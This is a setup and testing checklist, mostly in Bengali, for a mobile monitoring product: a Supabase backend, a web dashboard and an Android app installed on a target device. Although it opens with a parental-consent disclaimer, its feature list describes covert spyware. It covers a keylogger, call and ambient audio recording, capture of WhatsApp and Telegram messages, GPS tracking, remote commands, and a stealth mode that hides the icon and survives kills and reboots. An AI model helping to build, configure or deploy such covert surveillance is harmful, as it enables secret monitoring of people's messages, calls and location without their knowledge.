# Mobile Tracker Dashboard — Setup Checklist

> **সতর্কতা:** এই সফটওয়্যারটি শুধুমাত্র অভিভাবকীয় নিয়ন্ত্রণ এবং যথাযথ সম্মতিপ্রাপ্ত ডিভাইস মনিটরিংয়ের জন্য ব্যবহার করুন।

---

## 1. Supabase Setup

### Database
- [ ] Supabase প্রজেক্ট তৈরি করুন (supabase.com)
- [ ] SQL Editor-এ `supabase/migrations/001_core_tables.sql` রান করুন
- [ ] SQL Editor-এ `supabase/migrations/002_extended_tables.sql` রান করুন
- [ ] SQL Editor-এ `supabase/migrations/003_system_tables.sql` রান করুন
- [ ] SQL Editor-এ `supabase/setup_storage.sql` রান করুন
- [ ] SQL Editor-এ `supabase/enable_realtime.sql` রান করুন

### Storage Buckets
Storage ড্যাশবোর্ড থেকে নিচের ৭টি বকেট তৈরি করুন (Storage > New Bucket):

| Bucket Name         | Public | Max Size |
|---------------------|--------|----------|
| `call-recordings`   | No     | 50 MB    |
| `media`             | No     | 100 MB   |
| `screenshots`       | No     | 20 MB    |
| `ambient-recordings`| No     | 50 MB    |
| `avatars`           | Yes    | 5 MB     |
| `app-icons`         | Yes    | 2 MB     |
| `files`             | No     | 200 MB   |

- [ ] `call-recordings` বকেট তৈরি করুন
- [ ] `media` বকেট তৈরি করুন
- [ ] `screenshots` বকেট তৈরি করুন
- [ ] `ambient-recordings` বকেট তৈরি করুন
- [ ] `avatars` বকেট তৈরি করুন
- [ ] `app-icons` বকেট তৈরি করুন
- [ ] `files` বকেট তৈরি করুন

### Keys & Environment
- [ ] Supabase Project URL কপি করুন → `.env.local` এ `NEXT_PUBLIC_SUPABASE_URL` সেট করুন
- [ ] Supabase `anon` key কপি করুন → `.env.local` এ `NEXT_PUBLIC_SUPABASE_ANON_KEY` সেট করুন
- [ ] Supabase `service_role` key কপি করুন → `.env.local` এ `SUPABASE_SERVICE_ROLE_KEY` সেট করুন

---

## 2. Web Dashboard Setup

- [ ] `npm install` রান করুন
- [ ] `.env.local` ফাইল কনফিগার করুন (`.env.example` দেখুন)
- [ ] `npm run build` রান করুন (কোনো error নেই কিনা যাচাই করুন)
- [ ] Vercel/Hosting-এ ডিপ্লয় করুন
- [ ] Registration এবং Login পরীক্ষা করুন
- [ ] সব Dashboard পেজ পরীক্ষা করুন

---

## 3. Android App Setup

- [ ] Android Studio-তে প্রজেক্ট খুলুন
- [x] `local.properties` এ Supabase URL ও কী সেট করুন
- [ ] Signing keystore তৈরি করুন
- [ ] Release APK বিল্ড করুন: `./gradlew assembleRelease`
- [ ] টার্গেট ডিভাইসে APK ইনস্টল করুন
- [ ] Setup wizard সম্পন্ন করুন
- [ ] সব permissions গ্রান্ট করুন
- [ ] Dashboard-এ ডেটা দেখা যাচ্ছে কিনা যাচাই করুন

---

## 4. Feature Testing Checklist

### Communication
- [ ] SMS tracking কাজ করছে
- [ ] Call logging কাজ করছে
- [ ] Call recording কাজ করছে
- [ ] Social media messages capture হচ্ছে (WhatsApp, Telegram, etc.)
- [ ] Keylogger টেক্সট capture করছে
- [ ] সব notification capture হচ্ছে
- [ ] Browser history track হচ্ছে

### Location & Device
- [ ] GPS location tracking কাজ করছে
- [ ] Contact syncing কাজ করছে
- [ ] Photo detection কাজ করছে
- [ ] App list synced হচ্ছে
- [ ] Wi-Fi network logging কাজ করছে

### Remote Control
- [ ] Remote commands execute হচ্ছে
- [ ] Alerts generate হচ্ছে
- [ ] App blocking কাজ করছে
- [ ] Website blocking কাজ করছে

### Reports & Export
- [ ] Reports generate হচ্ছে (PDF/Excel/CSV)
- [ ] Export button সব পেজে কাজ করছে

### Reliability
- [ ] Device reboot-এর পরেও service চালু থাকে
- [ ] Kill-এর পরে service restart হয়
- [ ] Stealth mode active (icon hidden)

---

## 5. Environment Variables Reference

```env
# .env.local
NEXT_PUBLIC_SUPABASE_URL=https://your-project.supabase.co
NEXT_PUBLIC_SUPABASE_ANON_KEY=your-anon-key-here
SUPABASE_SERVICE_ROLE_KEY=your-service-role-key-here
```

---

## 6. Useful Commands

```bash
# Dependencies install
npm install

# Development server
npm run dev

# Production build
npm run build

# Type-check
npx tsc --noEmit
```

---

*শেষ আপডেট: 2026-03-28*
